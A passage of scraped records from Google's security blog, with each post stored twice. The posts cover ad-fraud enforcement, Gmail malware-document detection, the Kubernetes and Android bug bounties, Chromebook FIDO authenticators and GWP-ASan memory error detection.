Security Keys for any site where FIDO security keys are supported for 2FA, including your personal or work Google Account, 1Password, Bitbucket, Bitfinex, Coinbase, Dropbox, Facebook, GitHub, Salesforce, Stripe, Twitter, and more.     ", "date": "February 18, 2020"},
{"website": "Google-Security", "title": "\nDisruptive ads enforcement and our new approach\n", "author": ["Posted by Per Bjorke, Senior Product Manager, Ad Traffic Quality"], "link": "https://security.googleblog.com/2020/02/disruptive-ads-enforcement-and-our-new.html", "abstract": "                             Posted by Per Bjorke, Senior Product Manager, Ad Traffic Quality    As part of our ongoing efforts &#8212; along with help from newly developed technologies &#8212; today we&#8217;re announcing nearly 600 apps have been removed from the Google Play Store and banned from our ad monetization platforms, Google AdMob and Google Ad Manager, for violating our  disruptive ads policy  and  disallowed interstitial policy .    Mobile ad fraud is an industry-wide challenge that can appear in many different forms with a variety of methods, and it has the potential to harm users, advertisers and publishers. At Google, we have dedicated teams focused on detecting and stopping malicious developers that attempt to defraud the mobile ecosystem. As part of these efforts we take action against those who create seemingly innocuous apps, but which actually violate our ads policies.   We define disruptive ads as ads that are displayed to users in unexpected ways, including impairing or interfering with the usability of device functions. While they can occur in-app, one form of disruptive ads we&#8217;ve seen on the rise is something we call out-of-context ads, which is when malicious developers serve ads on a mobile device when the user is not actually active in their app.    This is an invasive maneuver that results in poor user experiences that often disrupt key device functions and this approach can lead to unintentional ad clicks that waste advertiser spend. For example, imagine being unexpectedly served a full-screen ad when you attempt to make a phone call, unlock your phone, or while using your favorite map app&#8217;s turn-by-turn navigation.   Malicious developers continue to become more savvy in deploying and masking disruptive ads, but we&#8217;ve developed new technologies of our own to protect against this behavior. We recently developed an innovative machine-learning based approach to detect when apps show out-of-context ads, which led to the enforcement we&#8217;re announcing today.   As we move forward, we will continue to invest in new technologies to detect and prevent emerging threats that can generate invalid traffic, including disruptive ads, and to find more ways to adapt and evolve our platform and ecosystem policies to ensure that users and advertisers are protected from bad behavior.                                    Posted by Per Bjorke, Senior Product Manager, Ad Traffic Quality  As part of our ongoing efforts — along with help from newly developed technologies — today we’re announcing nearly 600 apps have been removed from the Google Play Store and banned from our ad monetization platforms, Google AdMob and Google Ad Manager, for violating our disruptive ads policy and disallowed interstitial policy.   Mobile ad fraud is an industry-wide challenge that can appear in many different forms with a variety of methods, and it has the potential to harm users, advertisers and publishers. At Google, we have dedicated teams focused on detecting and stopping malicious developers that attempt to defraud the mobile ecosystem. As part of these efforts we take action against those who create seemingly innocuous apps, but which actually violate our ads policies.  We define disruptive ads as ads that are displayed to users in unexpected ways, including impairing or interfering with the usability of device functions. While they can occur in-app, one form of disruptive ads we’ve seen on the rise is something we call out-of-context ads, which is when malicious developers serve ads on a mobile device when the user is not actually active in their app.   This is an invasive maneuver that results in poor user experiences that often disrupt key device functions and this approach can lead to unintentional ad clicks that waste advertiser spend. For example, imagine being unexpectedly served a full-screen ad when you attempt to make a phone call, unlock your phone, or while using your favorite map app’s turn-by-turn navigation.  Malicious developers continue to become more savvy in deploying and masking disruptive ads, but we’ve developed new technologies of our own to protect against this behavior. We recently developed an innovative machine-learning based approach to detect when apps show out-of-context ads, which led to the enforcement we’re announcing today.  As we move forward, we will continue to invest in new technologies to detect and prevent emerging threats that can generate invalid traffic, including disruptive ads, and to find more ways to adapt and evolve our platform and ecosystem policies to ensure that users and advertisers are protected from bad behavior.     ", "date": "February 20, 2020"},
{"website": "Google-Security", "title": "\nImproving Malicious Document Detection in Gmail with Deep Learning\n", "author": ["Posted by Elie Bursztein, Security & Anti-Abuse Research Lead; David Tao, Software Engineer; Neil Kumaran, Product Manager, Gmail Security "], "link": "https://security.googleblog.com/2020/02/improving-malicious-document-detection.html", "abstract": "                             Posted by Elie Bursztein, Security &amp; Anti-Abuse Research Lead; David Tao, Software Engineer; Neil Kumaran, Product Manager, Gmail Security&nbsp;       Gmail protects your incoming mail against spam, phishing attempts, and malware. Our existing machine learning models are highly effective at doing this, and in conjunction with our other protections, they help block more than  99.9%  of threats from reaching Gmail inboxes.         One of our key protections is our malware scanner that processes more than 300 billion attachments each week to block harmful content.  63% percent of the malicious documents we block differ from day to day. To stay ahead of this constantly evolving threat, we recently added a new generation of document scanners that rely on deep learning to improve our detection capabilities. We&#8217;re sharing the details of this technology and its early success this week at  RSA 2020 .                                 Since the new scanner launched at the end of 2019, we have increased our daily detection coverage of Office documents that contain malicious scripts by 10%. Our technology is especially helpful at detecting adversarial, bursty attacks. In these cases, our new scanner has improved our detection rate by 150%. Under the hood, our new scanner uses a distinct TensorFlow deep-learning model trained with  TFX (TensorFlow Extended)  and a custom document analyzer for each file type. The document analyzers are responsible for parsing the document, identifying common attack patterns, extracting macros, deobfuscating content, and performing feature extraction.                                Strengthening our document detection capabilities is one of our key focus areas, as malicious documents represent 58% of the malware targeting Gmail users. We are still actively developing this technology, and right now, we only use it to scan Office documents.                                      Our new scanner runs in parallel with existing detection capabilities, all of which contribute to the final verdict of our decision engine to block a malicious document. Combining different scanners is one of the cornerstones of our defense-in-depth approach to help protect users and ensure our detection system is resilient to adversarial attacks.         We will continue to actively expand the use of artificial intelligence to protect our users&#8217; inboxes, and to stay ahead of attacks.                                              Posted by Elie Bursztein, Security & Anti-Abuse Research Lead; David Tao, Software Engineer; Neil Kumaran, Product Manager, Gmail Security    Gmail protects your incoming mail against spam, phishing attempts, and malware. Our existing machine learning models are highly effective at doing this, and in conjunction with our other protections, they help block more than 99.9% of threats from reaching Gmail inboxes.    One of our key protections is our malware scanner that processes more than 300 billion attachments each week to block harmful content.  63% percent of the malicious documents we block differ from day to day. To stay ahead of this constantly evolving threat, we recently added a new generation of document scanners that rely on deep learning to improve our detection capabilities. We’re sharing the details of this technology and its early success this week at RSA 2020.                Since the new scanner launched at the end of 2019, we have increased our daily detection coverage of Office documents that contain malicious scripts by 10%. Our technology is especially helpful at detecting adversarial, bursty attacks. In these cases, our new scanner has improved our detection rate by 150%. Under the hood, our new scanner uses a distinct TensorFlow deep-learning model trained with TFX (TensorFlow Extended) and a custom document analyzer for each file type. The document analyzers are responsible for parsing the document, identifying common attack patterns, extracting macros, deobfuscating content, and performing feature extraction.               Strengthening our document detection capabilities is one of our key focus areas, as malicious documents represent 58% of the malware targeting Gmail users. We are still actively developing this technology, and right now, we only use it to scan Office documents.                  Our new scanner runs in parallel with existing detection capabilities, all of which contribute to the final verdict of our decision engine to block a malicious document. Combining different scanners is one of the cornerstones of our defense-in-depth approach to help protect users and ensure our detection system is resilient to adversarial attacks.    We will continue to actively expand the use of artificial intelligence to protect our users’ inboxes, and to stay ahead of attacks.         ", "date": "February 25, 2020"},
{"website": "Google-Security", "title": "\nSecuring open-source: how Google supports the new Kubernetes bug bounty\n", "author": ["Posted by Maya Kaczorowski, Product Manager, Container Security and Aaron Small, Product Manager, GKE On-Prem Security"], "link": "https://security.googleblog.com/2020/01/securing-open-source-how-google.html", "abstract": "                             Posted by Maya Kaczorowski, Product Manager, Container Security and Aaron Small, Product Manager, GKE On-Prem Security            At Google, we care deeply about the security of open-source projects, as they&#8217;re such a critical part of our infrastructure&#8212;and indeed everyone&#8217;s. Today, the Cloud-Native Computing Foundation (CNCF) announced a  new bug bounty program for Kubernetes  that we helped create and get up and running. Here&#8217;s a brief overview of the program, other ways we help secure open-source projects and information on how you can get involved.        Launching the Kubernetes bug bounty program        Kubernetes  is a CNCF project. As part of  its graduation criteria , the CNCF recently funded the project&#8217;s first  security audit , to review its core areas and identify potential issues. The audit identified and addressed several previously unknown security issues. Thankfully, Kubernetes already had a  Product Security Committee , including engineers from the  Google Kubernetes Engine  (GKE) security team, who respond to and patch any newly discovered bugs. But the job of securing an open-source project is never done. To increase awareness of Kubernetes&#8217; security model, attract new security researchers, and reward ongoing efforts in the community, the Kubernetes Product Security Committee began  discussions in 2018  about launching an official bug bounty program.        Find Kubernetes bugs, get paid          What kind of bugs does the bounty program recognize? Most of the content you&#8217;d think of as &#8216;core&#8217; Kubernetes, included at  https://github.com/kubernetes , is in scope. We&#8217;re interested in common kinds of security issues like remote code execution, privilege escalation, and bugs in authentication or authorization. Because Kubernetes is a community project, we&#8217;re also interested in the Kubernetes supply chain, including build and release processes that might allow a malicious individual to gain unauthorized access to commits, or otherwise affect build artifacts. This is a bit different from your standard bug bounty as there isn&#8217;t a &#8216;live&#8217; environment for you to test&#8212;Kubernetes can be configured in many different ways, and we&#8217;re looking for bugs that affect any of those (except when existing configuration options could mitigate the bug). Thanks to the CNCF&#8217;s ongoing support and funding of this new program, depending on the bug, you can be rewarded with a bounty anywhere from $100 to $10,000.       The bug bounty program has been in a private release for several months, with invited researchers submitting bugs and to help us test the triage process. And today, the new Kubernetes bug bounty program is live! We&#8217;re excited to see what kind of bugs you discover, and are ready to respond to new reports. You can learn more about the program and how to get involved  here .        Dedicated to Kubernetes security       Google has been involved in this new Kubernetes bug bounty from the get-go: proposing the program, completing vendor evaluations, defining the initial scope, testing the process, and onboarding  HackerOne  to implement the bug bounty solution. Though this is a big effort, it&#8217;s part of our ongoing commitment to securing Kubernetes. Google continues to be involved in every part of Kubernetes security, including  responding to vulnerabilities  as part of the Kubernetes Product Security Committee,  chairing the sig-auth Kubernetes special interest group , and  leading the aforementioned Kubernetes security audit . We realize that security is a critical part of any user&#8217;s decision to use an open-source tool, so we dedicate resources to help ensure we&#8217;re providing the best possible security for Kubernetes and GKE.    Although the Kubernetes bug bounty program is new, it isn&#8217;t a novel strategy for Google. We have enjoyed a close relationship with the security research community for many years and, in 2010, Google established our own  Vulnerability Rewards Program  (VRP). The VRP provides rewards for vulnerabilities reported in GKE and virtually all other Google Cloud services. (If you find a bug in GKE that isn&#8217;t specific to Kubernetes core, you should still report it to the Google VRP!) Nor is Kubernetes the only open-source project with a bug bounty program. In fact, we recently expanded our  Patch Rewards program  to provide financial rewards  both upfront and after-the-fact  for security improvements to open-source projects.         Help keep the world&#8217;s infrastructure safe.  Report a bug to the Kubernetes bug bounty , or a GKE bug to  the Google VRP .                                     Posted by Maya Kaczorowski, Product Manager, Container Security and Aaron Small, Product Manager, GKE On-Prem Security    At Google, we care deeply about the security of open-source projects, as they’re such a critical part of our infrastructure—and indeed everyone’s. Today, the Cloud-Native Computing Foundation (CNCF) announced a new bug bounty program for Kubernetes that we helped create and get up and running. Here’s a brief overview of the program, other ways we help secure open-source projects and information on how you can get involved.   Launching the Kubernetes bug bounty program  Kubernetes is a CNCF project. As part of its graduation criteria, the CNCF recently funded the project’s first security audit, to review its core areas and identify potential issues. The audit identified and addressed several previously unknown security issues. Thankfully, Kubernetes already had a Product Security Committee, including engineers from the Google Kubernetes Engine (GKE) security team, who respond to and patch any newly discovered bugs. But the job of securing an open-source project is never done. To increase awareness of Kubernetes’ security model, attract new security researchers, and reward ongoing efforts in the community, the Kubernetes Product Security Committee began discussions in 2018 about launching an official bug bounty program.   Find Kubernetes bugs, get paid    What kind of bugs does the bounty program recognize? Most of the content you’d think of as ‘core’ Kubernetes, included at https://github.com/kubernetes, is in scope. We’re interested in common kinds of security issues like remote code execution, privilege escalation, and bugs in authentication or authorization. Because Kubernetes is a community project, we’re also interested in the Kubernetes supply chain, including build and release processes that might allow a malicious individual to gain unauthorized access to commits, or otherwise affect build artifacts. This is a bit different from your standard bug bounty as there isn’t a ‘live’ environment for you to test—Kubernetes can be configured in many different ways, and we’re looking for bugs that affect any of those (except when existing configuration options could mitigate the bug). Thanks to the CNCF’s ongoing support and funding of this new program, depending on the bug, you can be rewarded with a bounty anywhere from $100 to $10,000.   The bug bounty program has been in a private release for several months, with invited researchers submitting bugs and to help us test the triage process. And today, the new Kubernetes bug bounty program is live! We’re excited to see what kind of bugs you discover, and are ready to respond to new reports. You can learn more about the program and how to get involved here.   Dedicated to Kubernetes security  Google has been involved in this new Kubernetes bug bounty from the get-go: proposing the program, completing vendor evaluations, defining the initial scope, testing the process, and onboarding HackerOne to implement the bug bounty solution. Though this is a big effort, it’s part of our ongoing commitment to securing Kubernetes. Google continues to be involved in every part of Kubernetes security, including responding to vulnerabilities as part of the Kubernetes Product Security Committee, chairing the sig-auth Kubernetes special interest group, and leading the aforementioned Kubernetes security audit. We realize that security is a critical part of any user’s decision to use an open-source tool, so we dedicate resources to help ensure we’re providing the best possible security for Kubernetes and GKE.  Although the Kubernetes bug bounty program is new, it isn’t a novel strategy for Google. We have enjoyed a close relationship with the security research community for many years and, in 2010, Google established our own Vulnerability Rewards Program (VRP). The VRP provides rewards for vulnerabilities reported in GKE and virtually all other Google Cloud services. (If you find a bug in GKE that isn’t specific to Kubernetes core, you should still report it to the Google VRP!) Nor is Kubernetes the only open-source project with a bug bounty program. In fact, we recently expanded our Patch Rewards program to provide financial rewards both upfront and after-the-fact for security improvements to open-source projects.    Help keep the world’s infrastructure safe. Report a bug to the Kubernetes bug bounty, or a GKE bug to the Google VRP.     ", "date": "January 14, 2020"},
{"website": "Google-Security", "title": "\nUsing a built-in FIDO authenticator on latest-generation Chromebooks \n", "author": ["Posted by Christiaan Brand, Product Manager, Google Cloud "], "link": "https://security.googleblog.com/2019/11/using-built-in-fido-authenticator-on.html", "abstract": "                             Posted by Christiaan Brand, Product Manager, Google Cloud&nbsp;                 We previously  announced  that starting with Chrome 76, most latest-generation Chromebooks gained the option to enable a built-in FIDO authenticator backed by hardware-based Titan security. For supported services (e.g. G Suite, Google Cloud Platform), enterprise administrators can now allow end users to use the power button on these devices to protect against certain classes of account takeover attempts. This feature is disabled by default, however, administrators can enable it by changing  DeviceSecondFactorAuthentication  policy in the Google Admin console.        Before we dive deeper into this capability, let&#8217;s first cover the main use cases FIDO technology solves, and then explore how this new enhancement can satisfy an advanced requirement that can help enterprise organizations.            Main use cases    FIDO technology  aims to solve three separate use cases for relying parties (or otherwise referred to as Internet services) by helping to:      Prevent phishing during initial login to a service on a new device;   Reverify a user&#8217;s identity to a service on a device on which they&#8217;ve already logged in to;&nbsp;   Confirm that the device a user is connecting from is still the original device where they logged in from previously. This is typically needed in the enterprise.&nbsp;    Security-savvy professionals may interpret the third use case as a special instance of use case #2. However, there are some differences, which we break down a bit further below:      In case #2, the problem that FIDO technology tries to solve is re-verifying a user&#8217;s identity by unlocking a private key stored on the device.   In case #3, FIDO technology helps to determine whether a previously created key is still available on the original device without any proof of who the user is.     How use case #1 works: Roaming security keys&nbsp;       Because the whole premise of this use case is one in which the user logs in on a brand new device they&#8217;ve never authenticated before, this requires the user to have a FIDO security key (removeable, cross-platform, or a roaming authenticator). By this definition, a built-in FIDO authenticator on Chrome OS devices would not be able to satisfy this requirement, because it would not be able to help verify the user&#8217;s identity without being set up previously. Upon initial log-in, the user&#8217;s identity is verified together with the presence of a security key (such as Google&#8217;s  Titan Security Key ) previously tied to their account.                  Titan Security Keys&nbsp;             Once the user is successfully logged in, trust is conferred from the security key to the device on which the user is logging on, usually by placing a cookie or other token on the device in order for the relying party to &#8220;remember&#8221; that the user already performed a second factor authenticator on this device. Once this step is completed, it is no longer necessary to require a physical second factor on this device because the presence of the cookie signals to the relying party that this device is to be trusted.     Optionally, some services might require the user to still periodically verify that it&#8217;s the correct user in front of the already recognized device (for example, particularly sensitive and regulated services such as financial services companies). In almost all cases, it shouldn&#8217;t be necessary for the user to also-in addition to providing their knowledge factor (such as a password) - re-present their second factor when re-authenticating as they&#8217;ve already done that during initial bootstrapping.    Note that on Chrome OS devices, your data is encrypted when you&#8217;re not logged on,  which further protects your data  against malicious access.            How use case #2 works: Re-authentication&nbsp;     Frequently referred to as &#8220;re-authentication,&#8221; use case #2 allows a relying party to reverify that the same user is still interacting with the service from a previously verified device. This mainly happens when a user performs an action that&#8217;s particularly sensitive, such as changing their password or when interacting with regulated services, such as financial services companies. In this case, a built-in biometric authenticator (e.g. a fingerprint sensor or PIN on Android devices) can be registered, which offers users a more convenient way to re-verify their identity to the service in question. In fact, we have  recently enabled  this use case on Android devices for some Google services.      Additionally, there are security benefits to this particular solution, as the relying party doesn&#8217;t only have to trust a previously issued cookie, but can now both verify that the right user is present (by means of a biometric) and that a particular private key is available on this particular device. Sometimes this promise is made based on key material stored in hardware (e.g. Titan security in Pixel Slate), which can be a strong indicator that the relying party is interacting with the right user on the right device.          How use case #3 works: Built-in device authenticator     The challenge of verifying that a device a user has previously logged in on is still the device from which they&#8217;re interacting with the relying party, is what the built-in FIDO authenticator on most latest-generation Chromebooks is able to help solve.     Earlier we noted that upon initial log-in, relying parties regularly place cookies or tokens on a user&#8217;s device, so they can remember that a user has previously authenticated. Under some circumstances, such as when there&#8217;s malware present on a device, it might be possible for these tokens to be exfiltrated. Asking for the &#8220;touch of a built-in authenticator&#8221; at regular intervals helps the relying party know that the user is still interacting from a legitimate device which has previously been issued a token. It also helps verify that the token has not been exfiltrated to a different device since FIDO authenticators offer increased protection against the exfiltration of the private key. This is because it&#8217;s usually housed in the hardware itself. For example, in the case of most latest-generation Chromebooks (e.g. Pixel Slate), it&#8217;s protected by hardware-based Titan security.                  Pixel Slate devices are built with hardware-based Titan security&nbsp;        In the case of our implementation on Chrome OS, the FIDO keys are also scoped to the specific logged in user, meaning that every user on the device essentially gets their own FIDO authenticator that can&#8217;t be accessed across user boundaries. We expect this use case to be particularly useful in enterprise environments, which is why the feature is not enabled by default. Administrators can enable it in the Google Admin console.      We still highly recommend users to have a primary FIDO security key, such as  Titan Security Key  or an  Android phone . This should be used in conjunction with a &#8220;FIDO re-authentication&#8221; policy,  which is supported  by G Suite.                 Enabling the built-in FIDO authenticator in the Google Admin console          Even though it&#8217;s technically possible to register the built-in FIDO authenticator on a Chrome OS device as a &#8220;security key&#8221; with services, it&#8217;s best to avoid this instance as users can run an increased risk of account lockout if they ever need to sign in to the service from a different machine.            Supported Chromebooks   Starting with Chrome 76, most latest-generation Chromebooks gained the option to enable a built-in FIDO authenticator backed by hardware-based Titan security. To see if your Chromebook can be enabled with this capability, you can navigate to chrome://system and check the &#8220;tpm-version&#8221; entry. If &#8220;vendor&#8221; equals &#8220;43524f53&#8221;, then your Chromebook is backed by Titan security.                  Navigating to chrome://system on your Chromebook           Summary        In summary, we believe that this new enhancement can provide value to enterprise organizations that want to confirm that the device a user is connecting from is still the original device from which a user logged in from in the past. Most users, however, should be using roaming FIDO security keys, such as  Titan Security Key , their  Android phone , or security keys from other vendors, in order to avoid account lockouts.                                     Posted by Christiaan Brand, Product Manager, Google Cloud     We previously announced that starting with Chrome 76, most latest-generation Chromebooks gained the option to enable a built-in FIDO authenticator backed by hardware-based Titan security. For supported services (e.g. G Suite, Google Cloud Platform), enterprise administrators can now allow end users to use the power button on these devices to protect against certain classes of account takeover attempts. This feature is disabled by default, however, administrators can enable it by changing DeviceSecondFactorAuthentication policy in the Google Admin console.    Before we dive deeper into this capability, let’s first cover the main use cases FIDO technology solves, and then explore how this new enhancement can satisfy an advanced requirement that can help enterprise organizations.    Main use cases FIDO technology aims to solve three separate use cases for relying parties (or otherwise referred to as Internet services) by helping to:   Prevent phishing during initial login to a service on a new device; Reverify a user’s identity to a service on a device on which they’ve already logged in to;  Confirm that the device a user is connecting from is still the original device where they logged in from previously. This is typically needed in the enterprise.   Security-savvy professionals may interpret the third use case as a special instance of use case #2. However, there are some differences, which we break down a bit further below:   In case #2, the problem that FIDO technology tries to solve is re-verifying a user’s identity by unlocking a private key stored on the device. In case #3, FIDO technology helps to determine whether a previously created key is still available on the original device without any proof of who the user is.  How use case #1 works: Roaming security keys    Because the whole premise of this use case is one in which the user logs in on a brand new device they’ve never authenticated before, this requires the user to have a FIDO security key (removeable, cross-platform, or a roaming authenticator). By this definition, a built-in FIDO authenticator on Chrome OS devices would not be able to satisfy this requirement, because it would not be able to help verify the user’s identity without being set up previously. Upon initial log-in, the user’s identity is verified together with the presence of a security key (such as Google’s Titan Security Key) previously tied to their account.       Titan Security Keys      Once the user is successfully logged in, trust is conferred from the security key to the device on which the user is logging on, usually by placing a cookie or other token on the device in order for the relying party to “remember” that the user already performed a second factor authenticator on this device. Once this step is completed, it is no longer necessary to require a physical second factor on this device because the presence of the cookie signals to the relying party that this device is to be trusted.   Optionally, some services might require the user to still periodically verify that it’s the correct user in front of the already recognized device (for example, particularly sensitive and regulated services such as financial services companies). In almost all cases, it shouldn’t be necessary for the user to also-in addition to providing their knowledge factor (such as a password) - re-present their second factor when re-authenticating as they’ve already done that during initial bootstrapping.  Note that on Chrome OS devices, your data is encrypted when you’re not logged on, which further protects your data against malicious access.    How use case #2 works: Re-authentication   Frequently referred to as “re-authentication,” use case #2 allows a relying party to reverify that the same user is still interacting with the service from a previously verified device. This mainly happens when a user performs an action that’s particularly sensitive, such as changing their password or when interacting with regulated services, such as financial services companies. In this case, a built-in biometric authenticator (e.g. a fingerprint sensor or PIN on Android devices) can be registered, which offers users a more convenient way to re-verify their identity to the service in question. In fact, we have recently enabled this use case on Android devices for some Google services.   Additionally, there are security benefits to this particular solution, as the relying party doesn’t only have to trust a previously issued cookie, but can now both verify that the right user is present (by means of a biometric) and that a particular private key is available on this particular device. Sometimes this promise is made based on key material stored in hardware (e.g. Titan security in Pixel Slate), which can be a strong indicator that the relying party is interacting with the right user on the right device.    How use case #3 works: Built-in device authenticator  The challenge of verifying that a device a user has previously logged in on is still the device from which they’re interacting with the relying party, is what the built-in FIDO authenticator on most latest-generation Chromebooks is able to help solve.   Earlier we noted that upon initial log-in, relying parties regularly place cookies or tokens on a user’s device, so they can remember that a user has previously authenticated. Under some circumstances, such as when there’s malware present on a device, it might be possible for these tokens to be exfiltrated. Asking for the “touch of a built-in authenticator” at regular intervals helps the relying party know that the user is still interacting from a legitimate device which has previously been issued a token. It also helps verify that the token has not been exfiltrated to a different device since FIDO authenticators offer increased protection against the exfiltration of the private key. This is because it’s usually housed in the hardware itself. For example, in the case of most latest-generation Chromebooks (e.g. Pixel Slate), it’s protected by hardware-based Titan security.       Pixel Slate devices are built with hardware-based Titan security    In the case of our implementation on Chrome OS, the FIDO keys are also scoped to the specific logged in user, meaning that every user on the device essentially gets their own FIDO authenticator that can’t be accessed across user boundaries. We expect this use case to be particularly useful in enterprise environments, which is why the feature is not enabled by default. Administrators can enable it in the Google Admin console.   We still highly recommend users to have a primary FIDO security key, such as Titan Security Key or an Android phone. This should be used in conjunction with a “FIDO re-authentication” policy, which is supported by G Suite.      Enabling the built-in FIDO authenticator in the Google Admin console   Even though it’s technically possible to register the built-in FIDO authenticator on a Chrome OS device as a “security key” with services, it’s best to avoid this instance as users can run an increased risk of account lockout if they ever need to sign in to the service from a different machine.    Supported Chromebooks Starting with Chrome 76, most latest-generation Chromebooks gained the option to enable a built-in FIDO authenticator backed by hardware-based Titan security. To see if your Chromebook can be enabled with this capability, you can navigate to chrome://system and check the “tpm-version” entry. If “vendor” equals “43524f53”, then your Chromebook is backed by Titan security.       Navigating to chrome://system on your Chromebook    Summary  In summary, we believe that this new enhancement can provide value to enterprise organizations that want to confirm that the device a user is connecting from is still the original device from which a user logged in from in the past. Most users, however, should be using roaming FIDO security keys, such as Titan Security Key, their Android phone, or security keys from other vendors, in order to avoid account lockouts.     ", "date": "November 19, 2019"},
{"website": "Google-Security", "title": "\nGWP-ASan: Sampling heap memory error detection in-the-wild\n", "author": ["Posted by Vlad Tsyrklevich, Dynamic Tools Team"], "link": "https://security.googleblog.com/2019/11/gwp-asan-sampling-heap-memory-error.html", "abstract": "                             Posted by Vlad Tsyrklevich, Dynamic Tools Team    Memory safety errors, like use-after-frees and out-of-bounds reads/writes, are a leading source of vulnerabilities in C/C++ applications. Despite investments in preventing and detecting these errors in Chrome, over 60% of high severity vulnerabilities in Chrome are memory safety errors. Some memory safety errors don&#8217;t lead to security vulnerabilities but simply cause crashes and instability.     Chrome uses state-of-the-art techniques to prevent these errors, including:        Coverage-guided   fuzzing  with  AddressSanitizer  (ASan)   Unit and integration testing with ASan   Defensive programming, like custom libraries to perform safe math or provide bounds checked containers   Mandatory code review       Chrome also makes use of sandboxing and exploit mitigations to complicate exploitation of memory errors that go undetected by the methods above.     AddressSanitizer is a compiler instrumentation that finds memory errors occurring on the heap, stack, or in globals. ASan is highly effective and one of the lowest overhead instrumentations available that detects the errors that it does; however, it still incurs an average 2-3x performance and memory overhead. This makes it suitable for use with unit tests or fuzzing, but not deployment to end users. Chrome used to deploy  SyzyASAN instrumented binaries  to detect memory errors. SyzyASAN had a similar overhead so it was only deployed to a small subset of users on the canary channel. It was discontinued after the Windows toolchain switched to LLVM.     GWP-ASan, also known by its recursive backronym, GWP-ASan Will Provide Allocation Sanity, is a sampling allocation tool designed to detect heap memory errors occurring in production with negligible overhead. Because of its negligible overhead we can deploy GWP-ASan to the entire Chrome user base to find memory errors happening in the real world that are not caught by fuzzing or testing with ASan. Unlike ASan, GWP-ASan can not find memory errors on the stack or in globals.     GWP-ASan is currently enabled for all Windows and macOS users for allocations made using malloc() and PartitionAlloc. It is only enabled for a small fraction of allocations and processes to reduce performance and memory overhead to a negligible amount. At the time of writing it has found  over sixty bugs  (many are still restricted view). About 90% of the issues GWP-ASan has found are use-after-frees. The remaining are out-of-bounds reads and writes.     To learn more, check out our full write up on GWP-ASan  here .                                     Posted by Vlad Tsyrklevich, Dynamic Tools Team  Memory safety errors, like use-after-frees and out-of-bounds reads/writes, are a leading source of vulnerabilities in C/C++ applications. Despite investments in preventing and detecting these errors in Chrome, over 60% of high severity vulnerabilities in Chrome are memory safety errors. Some memory safety errors don’t lead to security vulnerabilities but simply cause crashes and instability.   Chrome uses state-of-the-art techniques to prevent these errors, including:    Coverage-guided fuzzing with AddressSanitizer (ASan)  Unit and integration testing with ASan  Defensive programming, like custom libraries to perform safe math or provide bounds checked containers  Mandatory code review    Chrome also makes use of sandboxing and exploit mitigations to complicate exploitation of memory errors that go undetected by the methods above.   AddressSanitizer is a compiler instrumentation that finds memory errors occurring on the heap, stack, or in globals. ASan is highly effective and one of the lowest overhead instrumentations available that detects the errors that it does; however, it still incurs an average 2-3x performance and memory overhead. This makes it suitable for use with unit tests or fuzzing, but not deployment to end users. Chrome used to deploy SyzyASAN instrumented binaries to detect memory errors. SyzyASAN had a similar overhead so it was only deployed to a small subset of users on the canary channel. It was discontinued after the Windows toolchain switched to LLVM.   GWP-ASan, also known by its recursive backronym, GWP-ASan Will Provide Allocation Sanity, is a sampling allocation tool designed to detect heap memory errors occurring in production with negligible overhead. Because of its negligible overhead we can deploy GWP-ASan to the entire Chrome user base to find memory errors happening in the real world that are not caught by fuzzing or testing with ASan. Unlike ASan, GWP-ASan can not find memory errors on the stack or in globals.   GWP-ASan is currently enabled for all Windows and macOS users for allocations made using malloc() and PartitionAlloc. It is only enabled for a small fraction of allocations and processes to reduce performance and memory overhead to a negligible amount. At the time of writing it has found over sixty bugs (many are still restricted view). About 90% of the issues GWP-ASan has found are use-after-frees. The remaining are out-of-bounds reads and writes.   To learn more, check out our full write up on GWP-ASan here.      ", "date": "November 7, 2019"},
{"website": "Google-Security", "title": "\n Expanding the Android Security Rewards Program\n", "author": ["Posted by Jessica Lin, Android Security Team"], "link": "https://security.googleblog.com/2019/11/expanding-android-security-rewards.html", "abstract": "                             Posted by Jessica Lin, Android Security Team          The  Android Security Rewards  (ASR) program was created in 2015 to reward researchers who find and report security issues to help keep the Android ecosystem safe. Over the past 4 years, we have awarded over 1,800 reports, and paid out over four million dollars.     Today, we&#8217;re expanding the program and increasing reward amounts. We are introducing a top prize of $1 million for a full chain remote code execution exploit with persistence which compromises the Titan M secure element on Pixel devices. Additionally, we will be launching a specific program offering a 50% bonus for exploits found on specific developer preview versions of Android, meaning our top prize is now $1.5 million.     As mentioned in a  previous blog post,  in 2019 Gartner rated the Pixel 3 with Titan M as having the most &#8220;strong&#8221; ratings in the built-in security section out of all devices evaluated. This is why we&#8217;ve created a dedicated prize to reward researchers for exploits found to circumvent the secure elements protections.     In addition to exploits involving Pixel Titan M, we have added other categories of exploits to the rewards program, such as those involving data exfiltration and lockscreen bypass. These rewards go up to $500,000 depending on the exploit category. For full details, please refer to the  Android Security Rewards Program Rules page .      Now that we&#8217;ve covered some of what&#8217;s new, let&#8217;s take a look back at some milestones from this year. Here are some highlights from 2019:       Total payouts in the last 12 months have been over $1.5 million.         Over 100 participating researchers have received an average reward amount of over $3,800 per finding (46% increase from last year). On average, this means we paid out over $15,000 (20% increase from last year) per researcher!     The top reward paid out in 2019 was $161,337.       Top Payout       The highest reward paid out to a member of the research community was for a report from Guang Gong ( @oldfresher ) of Alpha Lab, Qihoo 360 Technology Co. Ltd. This report detailed the first reported 1-click remote code execution exploit chain on the Pixel 3 device. Guang Gong was awarded $161,337 from the  Android Security Rewards program  and $40,000 by  Chrome Rewards program  for a total of $201,337. The $201,337 combined reward is also the highest reward for a single exploit chain across all Google VRP programs. The Chrome vulnerabilities leveraged in this report were fixed in  Chrome 77.0.3865.75  and released in September, protecting users against this exploit chain.      We&#8217;d like to thank all of our researchers for contributing to the security of the Android ecosystem. If you&#8217;re interested in becoming a researcher, check out our  Bughunter University  for information on how to get started.      Starting today November 21, 2019 the new rewards take effect. Any reports that were submitted before November 21, 2019 will be rewarded based on the previously existing rewards table.      Happy bug hunting!                                     Posted by Jessica Lin, Android Security Team   The Android Security Rewards (ASR) program was created in 2015 to reward researchers who find and report security issues to help keep the Android ecosystem safe. Over the past 4 years, we have awarded over 1,800 reports, and paid out over four million dollars.   Today, we’re expanding the program and increasing reward amounts. We are introducing a top prize of $1 million for a full chain remote code execution exploit with persistence which compromises the Titan M secure element on Pixel devices. Additionally, we will be launching a specific program offering a 50% bonus for exploits found on specific developer preview versions of Android, meaning our top prize is now $1.5 million.   As mentioned in a previous blog post, in 2019 Gartner rated the Pixel 3 with Titan M as having the most “strong” ratings in the built-in security section out of all devices evaluated. This is why we’ve created a dedicated prize to reward researchers for exploits found to circumvent the secure elements protections.   In addition to exploits involving Pixel Titan M, we have added other categories of exploits to the rewards 